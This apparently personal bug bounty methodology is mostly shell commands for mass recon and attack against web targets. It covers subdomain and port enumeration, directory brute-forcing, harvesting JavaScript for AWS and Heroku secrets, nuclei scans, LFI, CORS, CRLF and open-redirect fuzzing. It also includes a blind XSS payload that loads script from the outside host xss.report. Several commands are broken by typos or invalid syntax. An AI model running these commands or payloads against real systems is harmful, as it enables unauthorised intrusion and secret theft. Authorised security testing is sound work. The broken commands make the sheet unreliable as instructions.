# Bug Bounty Methodology
## PART I
    subfinder -dL domains.txt -all -recursive -o subdomains.txt
    cat subdomains.txt | wc -l
    
    curl -s https://crt.sh/\?q\=\amazon.com\&output\=jsom | jq -r '.[].name_value' | grep -Po '(\w+\.\w+\.\w+)$' | anew subdomains.txt
    
    cat subdomains.txt | httpx-toolkit -l subdomains.txt -ports 443,80,8080,8000,8888 -threads 200 > subdomains_alive.txt
    cat subdomains_alive.txt | wc -l

    naabu -list subdomains.txt -c 50 -nmap-cli 'nmap -sV -sC' -o naabu-full.txt

    dirsearch -l subdomains_alive.txt -x 500,502,429,404,400 -R 5 --random-agent -t 100 -F -o directory.txt -w /usr/share/seclists/common.txt
    cat directory.txt | wc -l

    cat subdomains_alive.txt | gau > params.txt
    cat params.txt | wc -l

    cat params.txt | uro -o filterparam.txt
    cat filterparam.txt | wc -l
    
    cat filterparam.txt | grep ".js$" > jsfiles.txt
    cat jsfiles.txt | uro | anew jsfiles.txt
    cat jsfiles.txt | wc -l

    # use SecretFinder module to extract secret info from jsfile
    cat jsfiles.txt | while read url; do python3 /SecretFinder.py -i $url -o cli >> secret.txt; done
    cat secret.txt | grep aws/username//account_id/heroku           ## use keywords that could reveal secrets
    cat secret.txt | heroku                                         ## recon-understand-try-improve-repeat

    nuclei -list filterparam.txt -c 70 -rl 200 -fhr -lfa -t /Nuclei-Template -o nuclei-target.txt -es info 
    nuclei -list sorted_param_10k.txt -c 70 -rl 200 -fhr -lfa -t /Nuclei-Template -o nuclei-target.txt -es info 

    ## Shodan.com => Search         ::=> "ssl: 'traget.com' 200"
    ## Shodan.com => Facet Analysis ::=> "ssl: 'traget.com' 200" "http:status/title"

## PART II
    subfinder -d target.coom -all -recursive > subdomains.txt 
    cat subdomains.txt | httpx-toolkit -ports 443,80,8080,8000,8888 -threads 200 > subdomains_alive.txt

    katana -u subdomains_alive.txt -d 5 -ps -pss -waybackarchive,commoncrawl,alienvault -kf -jc -fx -ef wolf,css,png,svg,jpg,wolf2,jpeg,gif,svg -o allurls.txt
    cat allurls.txt | wc- l

    cat allurls.txt | grep -E "\.txt|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.json|\.gz|\.rar|\.zip|\.config"
    cat allurls.txt | grep -E "\.js$" >> js.txt

    cat js.txt | nuclei -t /Nuclei-Template/http/exposures/ -c 30

    echo www.target.com | kanata -ps | grep -E "\.js$" | nuclei -t /Nuclei-Template/http/exposures/ -c 30

    dirsearch -u https://www.validator.com -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bkp,cache,cgi,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,sql,sql.gz,http://sql.zip,sql.tar,gz,sql~,swp,tar,tar.bz2,tar.gz,txt,wadl,zip,.log,.xml,.js,.json

    subfinder -d target.com | httpx-toolkit -silent | katana -ps -f qurl | gf xss | bxss -appendMode -payload '"><script src=https://xss.report/c/coffinxp ></script>' -parameters

    subzy run --targets subdomains_alive.txt --verify-ssl
    # subzy run --targets subdomains_alive.txt --concurrency 100 --hide-fails --verify-ssl

    cat subdomains.txt | grep dashboard
    cat subdomains.txt | grep admin/beta/staging/dev/control/panel/api/old      # Run seperately
 
    python3 corsy.py -i /subdomains_alive.txt -t 10 --headers "User-Agent: GoogleBot\nCookie: SESSION:Hacked"

    nuclei -list /subdomains_alive.txt -t /Priv8-Nuclei/cors
    nuclei -list /subdomains_alive.txt -tags cves,osint,tech

    cat allurls.txt | gf lfi | nuclei -tags lfi

    bash make-payloads.sh www.target.com
    cat allurls.txt | gf redirect | openredirex -p /Open-Redirect/payloads/burp/www.target.com.txt 

    cat subdomains.txt | nuclei -t /Priv8-Nuclei/crlf/crlf2.yaml -v 
    cat allurls.txt | gf redirect | openredirex

    shortscan https://mam.target.com/ -F        # run twice or trice

## PART III - OpenRedirect
    ::=> Google => site:target.com inurl:redir |inurl: redirect | inurl:url | inurl:return | inurl:src=http | inurl:r=http | inurl:goto=http
    ::=> Use chrome extensions as well and use GoogleDorks indepth



